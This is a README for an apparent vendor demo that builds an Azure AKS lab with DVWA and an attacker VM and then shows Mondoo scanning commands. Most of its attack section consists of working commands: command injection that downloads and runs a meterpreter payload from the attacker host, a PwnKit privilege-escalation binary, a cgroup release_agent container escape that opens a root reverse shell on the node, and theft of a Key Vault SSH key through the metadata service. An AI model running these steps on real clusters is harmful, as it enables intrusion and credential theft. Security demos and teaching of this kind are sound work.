# AKS container escape demo

DVWA is the "Damn Vulnerable Web Application" that will be used to demonstrate how a vulnerability in a container can lead to access to the host and to the cluster.

This folder contains Terraform automation code to provision the following:

- **Azure AKS Cluster** - 2 worker managed nodes (standard_d2_v2)
- **Ubuntu 18.04 Linux Instance** - This instance is provisioned for the demonstration of the container-escape demo.

<!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList=false} -->

<!-- code_chunk_output -->

- [AKS container escape demo](#aks-container-escape-demo)
  - [Prerequsites](#prerequsites)
  - [Provision the cluster](#provision-the-cluster)
  - [Connect to the cluster](#connect-to-the-cluster)
  - [Deploy Mondoo Operator to AKS](#deploy-mondoo-operator-to-aks)
    - [Deploy cert-manager](#deploy-cert-manager)
    - [Deploy Mondoo Operator](#deploy-mondoo-operator)
  - [Deploy and configure DVWA](#deploy-and-configure-dvwa)
    - [Configure Port Forwarding](#configure-port-forwarding)
    - [Login to DVWA](#login-to-dvwa)
  - [Setup Attacker Linux Instance](#setup-attacker-linux-instance)
    - [Start the container listener](#start-the-container-listener)
    - [Start the host listener](#start-the-host-listener)
    - [Start Ruby webserver](#start-ruby-webserver)
  - [Escape time](#escape-time)
    - [Escalate Privileges on the container](#escalate-privileges-on-the-container)
    - [Gain access to worker nodes](#gain-access-to-worker-nodes)
  - [Mondoo scan commands](#mondoo-scan-commands)
    - [Scan kubernetes manifest](#scan-kubernetes-manifest)
    - [Scan container image from registry](#scan-container-image-from-registry)
    - [Scan kubernetes aks cluster](#scan-kubernetes-aks-cluster)
    - [Shell to kubernetes aks cluster](#shell-to-kubernetes-aks-cluster)
    - [Scan a azure subscription](#scan-a-azure-subscription)
    - [Shell to azure subscription](#shell-to-azure-subscription)
  - [Destroy the cluster](#destroy-the-cluster)
  - [License and Author](#license-and-author)
  - [Disclaimer](#disclaimer)

<!-- /code_chunk_output -->

## Prerequsites

- [Azure Account](https://azure.microsoft.com/en-us/free/)
- [AZ CLI](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli)
- [Terraform](https://learn.hashicorp.com/tutorials/terraform/install-cli) 
- [`kubectl`]() - Kubectl must be installed on the host that you run `terraform` from.

## Provision the cluster

1. Clone the project

```bash title="Clone the project"
git clone git@github.com:Lunalectric/container-escape.git
```

2. cd into the terraform folder

```
cd container-escape/azure
```

3. Initialize the project (download modules)

```
terraform init
```

4. Check that everything is ready

```
terraform plan
```

5. Apply the configuration

```
terraform apply -auto-approve
```

Once the provisioning completes you will see something like this:

```bash
Apply complete! Resources: 14 added, 0 changed, 0 destroyed.

Outputs:

public_ip_address = "13.92.179.31"
resource_group_name = "rg-Lunalectric-container-escape"
summary = <<EOT

attacker vm public ip: 13.92.179.31

terraform output -raw tls_private_key > id_rsa
ssh -o StrictHostKeyChecking=no -i id_rsa azureuser@13.92.179.31

export KUBECONFIG="\$\{PWD}/aks-kubeconfig"
kubectl apply -f dvwa-deployment.yml
kubectl port-forward $(kubectl get pods -o name) 8080:80


Hacking commands:

dvwa-browser---------------

;curl -vk http://13.92.179.31:8001/met-container -o /tmp/met
;chmod 777 /tmp/met
;/tmp/met

privilege-escalation-------

cd /tmp
curl -vkO https://pwnkit.s3.amazonaws.com/priv-es
chmod a+x ./priv-es
./priv-es

container-escape-----------

mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "curl -vk http://13.92.179.31:8001/met-host -o /tmp/met" >> /cmd
echo "chmod 777 /tmp/met" >> /cmd
echo "/tmp/met" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

EOT
tls_private_key = <sensitive>
```

## Connect to the cluster

After Terraform finishes provisioning, you find your `aks-kubeconfig` Kubeconfig in the folder to connect to your AKS cluster:

Configure kubectl to use the aks-kubeconfig to connect to your AKS cluster

```bash
export KUBECONFIG="${PWD}/aks-kubeconfig"
```

```bash
kubectl get nodes
NAME                              STATUS   ROLES   AGE   VERSION
aks-default-41472297-vmss000000   Ready    agent   24m   v1.22.11
aks-default-41472297-vmss000001   Ready    agent   24m   v1.22.11
```

## Deploy Mondoo Operator to AKS

Deploy the Mondoo Operator to the AKS cluster according the manual [https://mondoo.com/docs/tutorials/kubernetes/scan-kubernetes-with-operator/](https://mondoo.com/docs/tutorials/kubernetes/scan-kubernetes-with-operator/)

### Deploy cert-manager

At first deploy the cert-manager from [https://cert-manager.io/docs/installation/](https://cert-manager.io/docs/installation/):

```bash
kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.9.1/cert-manager.yaml
```

### Deploy Mondoo Operator

Create a Kubernetes Integration in the Mondoo Dashboard [https://console.mondoo.com/](https://console.mondoo.com/).

![](../assets/mondoo-dashboard-k8s-integration-aks.png)

Copy and paste the install commands from the Mondoo Dashboard to deploy the Mondoo Operator

![](../assets/mondoo-dashboard-k8s-install-commands-aks.png)

## Deploy and configure DVWA

Deploy the DVWA application to your AKS cluster.

```bash
kubectl apply -f ../assets/dvwa-deployment.yml
deployment.apps/dvwa-container-escape created
```

Check if the deployment and pod is working.

```bash
kubectl get deployments
NAME                    READY   UP-TO-DATE   AVAILABLE   AGE
dvwa-container-escape   1/1     1            1           47s
```

```bash
kubectl describe pods
Name:         dvwa-container-escape-5576f8b947-cv7tv
Namespace:    default
Priority:     0
Node:         aks-default-27813111-vmss000000/10.224.0.4
Start Time:   Mon, 15 Aug 2022 19:42:30 +0200
Labels:       app=dvwa-container-escape
              pod-template-hash=5576f8b947
Annotations:  <none>
Status:       Running
IP:           10.244.0.6
IPs:
  IP:           10.244.0.6
Controlled By:  ReplicaSet/dvwa-container-escape-5576f8b947
Containers:
  dvwa:
    Container ID:   containerd://1c0239ca76d10dd88a04eecdfd134835f594f0bc5ec143314b833263ae54db60
    Image:          public.ecr.aws/x6s5a8t7/dvwa:latest
    Image ID:       public.ecr.aws/x6s5a8t7/dvwa@sha256:8791eab52f1481d10e06bcd8a40188456ea3e5e4760e2f1407563c1e62e251f3
    Port:           80/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Mon, 15 Aug 2022 19:43:04 +0200
    Ready:          True
    Restart Count:  0
    Environment:    <none>
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-m68hr (ro)
Conditions:
  Type              Status
  Initialized       True
  Ready             True
  ContainersReady   True
  PodScheduled      True
Volumes:
  kube-api-access-m68hr:
    Type:                    Projected (a volume that contains injected data from multiple sources)
    TokenExpirationSeconds:  3607
    ConfigMapName:           kube-root-ca.crt
    ConfigMapOptional:       <nil>
    DownwardAPI:             true
QoS Class:                   BestEffort
Node-Selectors:              <none>
Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:
  Type    Reason     Age   From               Message
  ----    ------     ----  ----               -------
  Normal  Scheduled  115s  default-scheduler  Successfully assigned default/dvwa-container-escape-5576f8b947-cv7tv to aks-default-27813111-vmss000000
  Normal  Pulling    114s  kubelet            Pulling image "public.ecr.aws/x6s5a8t7/dvwa:latest"
  Normal  Pulled     81s   kubelet            Successfully pulled image "public.ecr.aws/x6s5a8t7/dvwa:latest" in 32.985551672s
  Normal  Created    81s   kubelet            Created container dvwa
  Normal  Started    81s   kubelet            Started container dvwa
```

### Configure Port Forwarding

Establish a port forwarding to reach the DVWA application via your browser. Open a terminal and run the following command to start port forward to the DVWA pod on `8080`:

```bash
kubectl port-forward $(kubectl get pods -o name) 8080:80
```

### Login to DVWA

![Log in to DVWA](../assets/dvwa_login.png)

Open a browser and navigate to http://localhost:8080.

Log in to DVWA using `admin` with the password `password`.

![Reset the Database](../assets/dvwa_db_reset.png)

Once logged in, click on "Create / Reset Database" after which, you will be logged out. Log back in to the web application and click on "Command Injection."

Next, open three command line terminals and continue the setup process.

## Setup Attacker Linux Instance

The Attacker Linux instance has all of the binaries and scripts you will need to hack the AKS deployment. Create your ssh-rsa key to access the Attacker instance:

```bash
terraform output -raw tls_private_key > id_rsa
```

Connect the to the Attacker instance via ssh command:

```bash
ssh -o StrictHostKeyChecking=no -i id_rsa azureuser@13.92.179.31
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1089-azure x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Aug 15 18:23:09 UTC 2022

  System load:  0.0               Processes:           108
  Usage of /:   9.2% of 28.89GB   Users logged in:     0
  Memory usage: 9%                IP address for eth0: 10.0.1.4
  Swap usage:   0%

0 updates can be applied immediately.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

azureuser@attacker:~$ sudo -i
root@attacker:~#
```

Once you have ssh'd on to the host you will find a `/root/container-escape` directory with the following files:

```bash
root@attacker:~# cd /root/container-escape/
root@attacker:~/container-escape# ls -la
total 1108
drwxr-xr-x 2 root root    4096 Aug 15 18:14 .
drwx------ 5 root root    4096 Aug 15 18:14 ..
-rwxr-xr-x 1 root root 1106792 Aug 15 18:14 met-container
-rwxr-xr-x 1 root root     207 Aug 15 18:14 met-host
-rwxr-xr-x 1 root root     129 Aug 15 18:14 msfconsole1
-rwxr-xr-x 1 root root     123 Aug 15 18:14 msfconsole2
-rwxr-xr-x 1 root root      27 Aug 15 18:14 start_ruby_webserver
```

### Start the container listener

In the first terminal, start `msfconsole` listening on port `4242` for the container:

```bash
root@attacker:~# cd /root/container-escape/

root@attacker:~/container-escape# ./msfconsole1
[*] Using configured payload generic/shell_reverse_tcp
payload => linux/x86/meterpreter_reverse_tcp
lhost => 0.0.0.0
lport => 4242
[*] Started reverse TCP handler on 0.0.0.0:4242
```

### Start the host listener

In the second terminal, start `msfconsole` listening on port `4243` for the host:

```bash
azureuser@attacker:~$ sudo -i

root@attacker:~# cd /root/container-escape/

root@attacker:~/container-escape# ./msfconsole2
[*] Using configured payload generic/shell_reverse_tcp
payload => linux/x86/shell/reverse_tcp
lhost => 0.0.0.0
lport => 4243
[*] Started reverse TCP handler on 0.0.0.0:4243
```

### Start Ruby webserver

In the third terminal, start webserver with Ruby:

```bash
azureuser@attacker:~$ sudo -i

root@attacker:~# cd /root/container-escape/

root@attacker:~/container-escape# ./start_ruby_webserver
[2022-08-15 18:28:35] INFO  WEBrick 1.4.2
[2022-08-15 18:28:35] INFO  ruby 2.5.1 (2018-03-29) [x86_64-linux-gnu]
[2022-08-15 18:28:35] INFO  WEBrick::HTTPServer#start: pid=3850 port=8001
```

## Escape time

In the webapp (browser) do the first attack to gain access to the container.

```bash
;curl -vk http://<attacker_vm_public_ip>:8001/met-container -o /tmp/met
```

Change the permissions to make the script executable

```bash
;chmod 777 /tmp/met
```

Execute the script

```bash
;/tmp/met
```

Now you have a reverse meterpreter session from the container, to get a shell type `shell`

```bash
meterpreter > shell
Process 321 created.
Channel 1 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

You have a shell and are the `www-data` user.

### Escalate Privileges on the container

Now you need do the privilege escalation within the container to gain root. In the terminal where the container listener and run the following commands:

```bash
cd /tmp
```

Download the `priv-es` script to `/tmp`
```bash
curl -vkO https://pwnkit.s3.amazonaws.com/priv-es
```

Make the script executable:
```bash
chmod a+x ./priv-es
```

Execute the script
```bash
./priv-es
```

Show that you are now root on the container

```bash
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

### Gain access to worker nodes

Now that you are root you can execute the following command to perform the container escape. Before you do this change the `<attacker_vm_public_ip>`

```bash
mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "curl -vk http://<attacker_vm_public_ip>:8001/met-host -o /tmp/met" >> /cmd
echo "chmod 777 /tmp/met" >> /cmd
echo "/tmp/met" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Now you got the reverse shell with root privileges from the kubernetes node, to verify it, show your are root and compare the ip addresses with kubectl

```bash
[*] Sending stage (36 bytes) to 20.237.90.231
[*] Command shell session 1 opened (10.0.1.4:4243 -> 20.237.90.231:1024) at 2022-08-15 18:38:39 +0000

id
uid=0(root) gid=0(root) groups=0(root)
hostname
aks-default-41472297-vmss000000
```

```bash
kubectl get nodes
NAME                              STATUS   ROLES   AGE   VERSION
aks-default-41472297-vmss000000   Ready    agent   24m   v1.22.11
aks-default-41472297-vmss000001   Ready    agent   24m   v1.22.11
```

### Get keys from keyvault

Get the instance metadata

```bash
curl -s -H Metadata:true --noproxy "*" 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
```

Extract the keyvault name

```text
{ "name": "keyvault", "value": "keyvaultLunalectric-akic" }
```

Get the token and query for the key:value

```text
TOKEN=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net" -H "Metadata: true" | jq -r ".access_token" ) && curl -vk -s -H Metadata:true --noproxy "*" 'https://keyvaultLunalectric-akic.vault.azure.net/secrets/private-ssh-key?api-version=2016-10-01' -H "Authorization: Bearer $TOKEN"
```

Extract the ssh private key and save it in `key-ssh`

```
----BEGIN RSA PRIVATE KEY-----\nMIIJKgIBAA
....
```

Fix the format of the ssh private key and the permissions

```bash
cat key-ssh |sed 's/\\n/\n/g' > new-ssh-key

chmod 600 new-ssh-key
```

Get the public IP of the AKS node

```bash
curl -4 icanhazip.com
```

Connect via ssh to the AKS node

```bash
ssh -o StrictHostKeyChecking=no -i new-ssh-key ubuntu@40.88.137.64
```

## Mondoo scan commands

### Scan kubernetes manifest

```bash
mondoo scan k8s --path ../assets/dvwa-deployment.yml
```

### Scan container image from registry

```bash
mondoo scan cr docker.io/pmuench/dvwa-container-escape:latest
```

### Scan kubernetes aks cluster

```bash
mondoo scan k8s
```

### Shell to kubernetes aks cluster

```bash
mondoo shell -t k8s
```

List all of the pods and all of their settings:

```bash
k8s.pods { * }
```

Search for the dvwa pod and show `privileged: true`

```bash
k8s.pods.where( labels['app'] == /dvwa/ ) { * }
```

Use MQL to search for configuration across your cluster such as "are containers being pulled using `tags` or their image `digest`:

```bash
k8s.pods { _.containers { image containerImage { identifierType == "digest" } } }
```

You can also just turn that into an assertion where you expect that all containers use `digest` for `identifierType`:

```bash
k8s.pods.all( _.containers { image containerImage { identifierType == "digest" } })
```

You can also use a `where` clause and just turn that into a list and filter the results:

```bash
k8s.pods.where( _.containers { image containerImage { identifierType != "digest" } })
```

You can quick check the securityContext of your clusters to see if `allowPrivilegeEscalation` is set to `true`:

```bash
k8s.pods { containers { name securityContext } }
```

Turn it into an assertion:

```bash
k8s.pods.none(containers { securityContext['allowPrivilegeEscalation'] == true })
```

Get the list of pods that fail:

```bash
k8s.pods.where(containers { securityContext['allowPrivilegeEscalation'] != true })
```

### Scan a azure subscription

```bash
mondoo scan azure --subscription {subscriptionID}
```

### Shell to azure subscription

```bash
mondoo shell -t az --option subscriptionID={subscriptionID}
```

List Azure VMs

```bash
azurerm.compute.vms { * }
```

Get access policies of all vaults

```bash
azurerm.keyvault.vaults { vaultName properties }
```

## Destroy the cluster

```bash
terraform destroy -auto-approve
```

## License and Author

* Author:: Mondoo Inc

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

## Disclaimer

This or previous program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that we (Mondoo Inc) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not Mondoo Inc's responsibility.